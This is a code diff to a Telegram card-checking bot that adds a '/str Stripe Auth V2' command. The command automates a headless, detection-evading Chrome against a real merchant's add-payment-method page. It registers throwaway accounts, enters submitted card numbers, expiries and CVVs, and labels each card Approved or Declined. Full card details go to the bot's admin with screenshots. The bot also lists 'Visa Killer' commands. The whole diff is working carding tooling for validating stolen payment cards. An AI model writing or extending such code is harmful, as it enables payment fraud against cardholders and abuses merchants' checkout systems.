@@ -58,7 +58,7 @@ start_time = datetime.now()
 USER_DB_FILE = "users.json"
 
 # Commands we gate
-CMD_KEYS = ("bin", "kill", "kd", "ko", "zz", "st", "bt", "sort", "chk", "clean", "num", "adhar")
+CMD_KEYS = ("bin", "kill", "kd", "ko", "zz", "st", "str", "bt", "sort", "chk", "clean", "num", "adhar")
 
 # Per-command approvals, plus a legacy/global "all" set
 approved_cmds = {k: set() for k in CMD_KEYS}
@@ -1204,6 +1204,7 @@ async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "🤖 *Card Bot Help*\n\n"
         "🔐 *Auth Commands:*\n"
         "• /st <card> - Stripe Auth V1\n"
+        "• /str <card> - Stripe Auth V2\n"
         "• /bt <card> - Braintree Auth-1\n"
         "• /chk <card> - Braintree Auth-2\n\n"
         "🗡️ *Visa Killer Commands:*\n"
@@ -1379,6 +1380,7 @@ async def cmds_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Auth Gates
     parts.append("🔐 *Auth Gates*\n" + "\n".join([
         lock("/st <card> — Stripe Auth V1", "st"),
+        lock("/str <card> — Stripe Auth V2 (fast)", "str"),
         lock("/bt <card> — Braintree Auth-1", "bt"),
         lock("/chk <card> — Braintree Auth-2 (Under Development)", "chk"),
     ]))
@@ -3818,6 +3820,26 @@ def extract_all_card_inputs(raw_text: str):
 def run_st_process(card_input, update_dict):
     asyncio.run(st_single_main(card_input, update_dict))
 
+def run_str_process(card_input, update_dict):
+    asyncio.run(str_single_main(card_input, update_dict))
+
+def _wait_for_stripe_iframe_webdriverwait(driver, timeout=12) -> bool:
+    """
+    Faster, detection-based Stripe iframe wait (no blind sleeps).
+    Returns True if any Stripe iframe is detected before timeout.
+    """
+    sel = (
+        "iframe[name^='__privateStripeFrame'], "
+        "iframe[src*='stripe'], "
+        "iframe[src*='js.stripe.com'], "
+        "iframe[src*='m.stripe.network']"
+    )
+    try:
+        WebDriverWait(driver, timeout).until(lambda d: len(d.find_elements(By.CSS_SELECTOR, sel)) > 0)
+        return True
+    except Exception:
+        return False
+
 def _wait_for_stripe_iframe(driver, timeout=12):
     """Wait until *any* Stripe Elements iframe appears."""
     end = time.time() + timeout
@@ -4231,6 +4253,253 @@ async def st_single_main(card_input, update_dict):
             driver.quit()
         except:
             pass
+
+#
+# ==== 8.5 STRIPE AUTH V2 (/str) — Fast Single (detection-based waits) ====
+#
+async def str_single_main(card_input, update_dict):
+    uid = update_dict["user_id"]
+    chat_id = update_dict["chat_id"]
+    msg_id = update_dict["message_id"]
+    username = update_dict.get("username", "User")
+    bot = Bot(BOT_TOKEN)
+
+    parsed = parse_card_input(card_input)
+    if not parsed:
+        await bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=msg_id,
+            text="❌ Invalid format.\nUse: `/str 4111111111111111|08|25|123`",
+            parse_mode="Markdown",
+        )
+        return
+
+    card, mm, yy, cvv = parsed
+    expiry = f"{mm}/{yy}"
+    full_card = f"{card}|{mm}|20{yy}|{cvv}"
+    start_time_local = time.time()
+    bin_info, bin_details = get_bin_info(card[:6])
+    bin_flag = (bin_details or {}).get("country_flag", "")
+
+    driver = None
+    try:
+        ua = UserAgent().random if UserAgent else "Mozilla/5.0 Chrome/118"
+        options = webdriver.ChromeOptions()
+        options.binary_location = CHROME_PATH
+        options.add_argument(f"user-agent={ua}")
+        options.add_argument("--disable-blink-features=AutomationControlled")
+        options.add_argument("--headless=new")
+        options.add_argument("--no-sandbox")
+        options.add_argument("--disable-dev-shm-usage")
+        options.add_argument("--window-size=1920,1080")
+        options.add_experimental_option("excludeSwitches", ["enable-automation"])
+        options.add_experimental_option("useAutomationExtension", False)
+        # Faster page loads (we rely on element waits)
+        try:
+            options.set_capability("pageLoadStrategy", "eager")
+        except Exception:
+            pass
+
+        service = Service(executable_path=CHROME_DRIVER_PATH)
+        driver = webdriver.Chrome(service=service, options=options)
+        wait = WebDriverWait(driver, 12)
+
+        email = f"user{random.randint(10000,99999)}@example.com"
+        password = f"Pass{random.randint(1000,9999)}!"
+
+        # Goal: registration -> find Stripe iframes -> fill -> ZIP -> submit -> capture response
+        driver.get("https://www.shoprootscience.com/my-account/add-payment-method")
+
+        # Registration (best-effort; if already registered/logged in, continue)
+        try:
+            reg_email = WebDriverWait(driver, 6).until(EC.presence_of_element_located((By.ID, "reg_email")))
+            try:
+                reg_email.click()
+            except Exception:
+                pass
+            try:
+                reg_email.send_keys(Keys.CONTROL, "a")
+                reg_email.send_keys(Keys.BACKSPACE)
+            except Exception:
+                pass
+            reg_email.send_keys(email)
+            try:
+                reg_pw = driver.find_element(By.ID, "reg_password")
+                reg_pw.send_keys(password)
+            except Exception:
+                pass
+            try:
+                btn = driver.find_element(By.NAME, "register")
+                driver.execute_script("arguments[0].click();", btn)
+            except Exception:
+                pass
+        except Exception:
+            pass
+
+        # Make sure Stripe is visible (button sometimes needed after registration)
+        try:
+            _open_add_payment_form(driver, wait)
+        except Exception:
+            pass
+
+        if not _wait_for_stripe_iframe_webdriverwait(driver, timeout=12):
+            # Fallback to the older helper (still detection-based, but uses short polling)
+            if not _wait_for_stripe_iframe(driver, timeout=10):
+                raise Exception("❌ Stripe fields did not load")
+
+        _fill_stripe_fields_adaptive(driver, wait, card, expiry, cvv, clear_first=True)
+
+        # ZIP/postal (Stripe + outside)
+        try:
+            _fill_zip_outside_stripe_if_present(driver, _random_us_zip())
+        except Exception:
+            pass
+
+        # Avoid Link phone/email requirement where possible
+        try:
+            _st_opt_out_faster_checkout(driver)
+        except Exception:
+            pass
+
+        # Submit
+        place_btn = wait.until(EC.presence_of_element_located((By.ID, "place_order")))
+        try:
+            driver.execute_script("arguments[0].scrollIntoView({block:'center'});", place_btn)
+        except Exception:
+            pass
+        try:
+            wait.until(lambda d: place_btn.is_enabled() and not place_btn.get_attribute("disabled"))
+        except Exception:
+            pass
+        try:
+            wait.until(EC.element_to_be_clickable((By.ID, "place_order")))
+        except Exception:
+            pass
+        try:
+            place_btn.click()
+        except Exception:
+            driver.execute_script("arguments[0].click();", place_btn)
+
+        # Response capture (no blind sleeps)
+        def _notice_text(d):
+            try:
+                els = d.find_elements(By.CSS_SELECTOR, "div.woocommerce-message")
+                if els and els[0].text.strip():
+                    return ("success", els[0].text.strip())
+            except Exception:
+                pass
+            try:
+                els = d.find_elements(By.CSS_SELECTOR, "ul.woocommerce-error li")
+                if els and els[0].text.strip():
+                    return ("error", els[0].text.strip())
+            except Exception:
+                pass
+            return None
+
+        kind, response_text = WebDriverWait(driver, 12).until(lambda d: _notice_text(d))  # type: ignore[misc]
+        status = "Approved" if (kind == "success" and "successfully added" in response_text.lower()) else "Declined"
+        emoji = "✅" if status == "Approved" else "❌"
+        took = f"{time.time() - start_time_local:.2f}s"
+
+        result_msg = (
+            f"💳 **Card:** `{full_card}`\n"
+            f"🏦 **BIN:** `{bin_info}` {bin_flag}\n"
+            f"📟 **Status:** {emoji} **{status}**\n"
+            f"📩 **Response:** `{response_text}`\n"
+            f"🌐 **Gateway:** **Stripe-Auth-2**\n"
+            f"⏱ **Took:** **{took}**\n"
+            f"🧑‍💻 **Checked by:** **{username}** [`{uid}`]"
+        )
+        await bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=result_msg, parse_mode="Markdown")
+
+        # Best-effort: send screenshot to admin only for high-signal cases
+        # (approved responses and unknown edge cases are the most useful to review).
+        try:
+            if status == "Approved" or (response_text or "").strip().lower() == "unknown":
+                admin_caption = (
+                    "STR Response Capture\n"
+                    f"💳 `{full_card}`\n"
+                    f"🏦 `{bin_info}` {bin_flag}\n"
+                    f"📟 `{status}`\n"
+                    f"📩 `{_st_md_safe(response_text)[:320]}`\n"
+                    f"🧑‍💻 {username} [`{uid}`]"
+                )
+                await _st_send_admin_screenshot(bot, driver, admin_caption)
+        except Exception:
+            pass
+
+    except Exception as e:
+        await bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=msg_id,
+            text=f"❌ `/str` failed.\nError: `{str(e)[:350]}`",
+            parse_mode="Markdown",
+        )
+        # Admin capture for debugging
+        try:
+            admin_caption = (
+                "STR Error\n"
+                f"💳 `{full_card}`\n"
+                f"🏦 `{bin_info}` {bin_flag}\n"
+                f"📩 `{_st_md_safe(str(e))[:320]}`\n"
+                f"🧑‍💻 {username} [`{uid}`]"
+            )
+            await _st_send_admin_screenshot(bot, driver, admin_caption)
+        except Exception:
+            pass
+        try:
+            await bot.send_message(
+                chat_id=BOT_ADMIN_ID,
+                text=f"STR Error:\n```\n{traceback.format_exc()[:3500]}\n```",
+                parse_mode="Markdown",
+            )
+        except Exception:
+            pass
+    finally:
+        try:
+            if driver:
+                driver.quit()
+        except Exception:
+            pass
+
+async def str_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    uname = update.effective_user.first_name or "User"
+
+    if not is_approved(uid, "str"):
+        await update.message.reply_text("⛔ You are not approved to use this command.", reply_to_message_id=update.message.message_id)
+        return
+
+    if not is_cmd_enabled("str"):
+        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
+        return
+
+    raw_input = " ".join(context.args).strip() if context.args else ""
+    if not raw_input and update.message.reply_to_message:
+        raw_input = (update.message.reply_to_message.text or "").strip()
+
+    cards = extract_all_card_inputs(raw_input)
+    if not cards:
+        await update.message.reply_text("❌ No valid card found.\nUse: `/str 4111111111111111|08|25|123`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
+        return
+
+    if len(cards) > 1:
+        await update.message.reply_text(
+            "⚠️ `/str` is single-card only.\nSend **one** card at a time.\n\nUse: `/str 4111111111111111|08|25|123`",
+            parse_mode="Markdown",
+            reply_to_message_id=update.message.message_id,
+        )
+        return
+
+    card_input = cards[0]
+    msg = await update.message.reply_text(f"💳 `{card_input}`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
+    update_dict = {
+        "user_id": uid,
+        "chat_id": update.effective_chat.id,
+        "message_id": msg.message_id,
+        "username": uname,
+    }
+    Process(target=run_str_process, args=(card_input, update_dict), daemon=True).start()
 
 async def st_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
@@ -5304,6 +5573,7 @@ async def main():
         app.add_handler(CommandHandler("ko", ko_cmd))
         app.add_handler(CommandHandler("zz", zz_cmd))
         app.add_handler(CommandHandler("st", st_cmd))
+        app.add_handler(CommandHandler("str", str_cmd))
         app.add_handler(CommandHandler("bt", bt_cmd))
         app.add_handler(CommandHandler("chk", chk_cmd))
 
